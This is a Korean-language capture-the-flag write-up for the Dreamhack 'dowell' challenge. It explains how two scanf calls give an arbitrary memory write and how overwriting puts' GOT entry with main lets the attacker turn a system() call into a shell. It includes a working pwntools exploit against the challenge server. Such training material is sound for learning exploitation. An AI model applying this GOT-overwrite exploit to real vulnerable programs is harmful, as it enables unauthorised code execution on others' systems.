dreamhack dowell
============

## 코드 분석

<img width="656" height="381" alt="image" src="https://github.com/user-attachments/assets/0af47fa5-ab59-41ab-ae2b-6c034451db20" />


* 첫 번째 scanf: 정수형 입력 (%d)을 s[0]의 주소에 저장. s[0]은 char * 타입이므로 여기에 정수 값을 저장하면 포인터 값이 덮어씌워짐
* 두 번째 scanf: 문자열 입력 (%s)을 s[0]이 가리키는 주소에 저장. s[0]은 앞서 사용자 입력으로 덮어씌워진 값

## 익스플로잇

### 익스플로잇 분석: AAW(임의 주소 쓰기)


1.  **첫 번째 `__isoc99_scanf("%d", s);`:**

      * `s`는 `char *s[2]`로, `s[0]`과 `s[1]`을 포함하는 배열이다.
      * `s`의 주소는 사실상 `s[0]`의 주소와 동일합니다. `&s[0]`과 같다.
      * `%d` 형식 지정자는 정수를 입력받는다.
      * 문제는 `s[0]`이 `char *` 타입인데 여기에 `%d`로 정수 값을 입력받으면 `s[0]`이 가리키는 포인터 값이
        **사용자가 입력한 정수 값으로 덮어씌워지게 된다.**

2.  **두 번째 `__isoc99_scanf("%s", s[0]);`:**

      * `%s` 형식 지정자는 문자열을 입력받는다.
      * 여기서 `scanf`는 `s[0]`이 가리키는 주소에 문자열을 쓰려고 시도한다.
      * **앞서 첫 번째 `scanf`에서 `s[0]`의 값은 사용자가 임의로 지정한 주소로 변경되어 있다.**
      * 따라서 두 번째 `scanf`는
        **사용자가 첫 번째 `scanf`를 통해 지정한 임의의 메모리 주소(`s[0]`의 값)에 사용자가
        입력한 문자열을 쓸 수 있게 된다.**


*  **첫 번째 `scanf`로 `s[0]`의 값을 원하는 주소(`target_address`)로 조작한다.**
*  **두 번째 `scanf`로 `s[0]`이 가리키는 `target_address`에 원하는 데이터를 쓴다.**

---------------

일단 코드에서 쉘을 딸 수 있는 가장 유력한 방법은 **system함수의 인자인 st의 값을 조작해서 system("/bin/sh")를 실행** 하는 것이다.  

* st를 단순히 조작하기엔 이미 호출 시점에 system이 호출되고난 후이므로 main을 가지고 조작해야 한다.
* puts의 got 엔트리를 main의 시작 주소로 덮어씌운다면 puts가 호출될 때마다 프로그램 실행 흐름이 main 함수로 되돌아갈 것이다.
* AAW 취약점 (scanf("%d", s); 후 scanf("%s", s[0]);)을 이용하면 puts의 GOT 주소를 s[0]에 설정하고
   이후 main의 주소를 덮어쓸 수 있다.


### 익스플로잇 코드

```python
from pwn import *

p = remote("host1.dreamhack.games", 17420)
e = ELF("./prob")

main = e.symbols['main']
st = 0x0000000000404080
puts_got = e.got['puts']

p.sendlineafter("pt: ", str(int(puts_got)))
p.sendlineafter("input: ", p64(main))

p.sendlineafter("pt: ", str(int(st)))
p.sendlineafter("input: ", b'/bin/sh')

p.interactive()
```

## 실행 결과

<img width="797" height="537" alt="image" src="https://github.com/user-attachments/assets/2957ea7c-6928-4a05-80b2-25908cec767c" />





